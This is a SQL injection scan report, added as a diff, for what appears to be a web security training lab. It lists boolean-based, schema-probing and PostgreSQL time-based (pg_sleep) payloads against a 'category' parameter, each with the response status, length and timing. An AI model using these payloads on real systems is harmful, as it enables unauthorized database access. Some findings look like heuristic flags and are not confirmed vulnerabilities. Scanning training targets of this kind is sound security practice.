@@ -1,0 +1,153 @@
+============================================================
+  SQL Injection Scan Report
+============================================================
+
+  Date      : 2026-05-11 18:36:54
+  Target    : https://0aed00190322634880cfee9400130077.web-security-academy.net/filter
+  Parameter : category
+  Payloads  : 48 tested
+  Baseline  : status=200, length=3706
+
+------------------------------------------------------------
+
+  [!] 17 POTENTIAL VULNERABILITY(IES) FOUND
+
+  Finding #1
+  ────────────────────────────────────────
+    Payload : ' OR '1'='1
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 9636
+    Time    : 0.92s
+
+  Finding #2
+  ────────────────────────────────────────
+    Payload : ' OR '1'='1' --
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 11632
+    Time    : 0.99s
+
+  Finding #3
+  ────────────────────────────────────────
+    Payload : 1' ORDER BY 1--
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6673
+    Time    : 1.15s
+
+  Finding #4
+  ────────────────────────────────────────
+    Payload : ' AND 1=1--
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6669
+    Time    : 0.93s
+
+  Finding #5
+  ────────────────────────────────────────
+    Payload : ' AND 1=2--
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6669
+    Time    : 0.98s
+
+  Finding #6
+  ────────────────────────────────────────
+    Payload : ' AND 'a'='a
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6685
+    Time    : 1.01s
+
+  Finding #7
+  ────────────────────────────────────────
+    Payload : ' AND 'a'='b
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6685
+    Time    : 0.94s
+
+  Finding #8
+  ────────────────────────────────────────
+    Payload : ' OR 1=1--
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 14555
+    Time    : 0.91s
+
+  Finding #9
+  ────────────────────────────────────────
+    Payload : ' OR 1=2--
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6668
+    Time    : 0.93s
+
+  Finding #10
+  ────────────────────────────────────────
+    Payload : 1 AND 1=1
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6662
+    Time    : 0.95s
+
+  Finding #11
+  ────────────────────────────────────────
+    Payload : 1 AND 1=2
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6662
+    Time    : 0.92s
+
+  Finding #12
+  ────────────────────────────────────────
+    Payload : 1 OR 1=1
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6661
+    Time    : 0.93s
+
+  Finding #13
+  ────────────────────────────────────────
+    Payload : 1 OR 1=2
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6661
+    Time    : 0.89s
+
+  Finding #14
+  ────────────────────────────────────────
+    Payload : ' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+    Type(s) : Boolean-based
+    Status  : 200
+    Length  : 6719
+    Time    : 0.98s
+
+  Finding #15
+  ────────────────────────────────────────
+    Payload : '; SELECT pg_sleep(5)--
+    Type(s) : Time-based
+    Status  : 500
+    Length  : 5440
+    Time    : 6.03s
+
+  Finding #16
+  ────────────────────────────────────────
+    Payload : ' AND 1=(SELECT 1 FROM pg_sleep(5))--
+    Type(s) : Time-based
+    Status  : 200
+    Length  : 6695
+    Time    : 6.00s
+
+  Finding #17
+  ────────────────────────────────────────
+    Payload : ' || pg_sleep(5)--
+    Type(s) : Time-based
+    Status  : 0
+    Length  : 0
+    Time    : 15.00s
+
+------------------------------------------------------------
+  End of Report
+============================================================
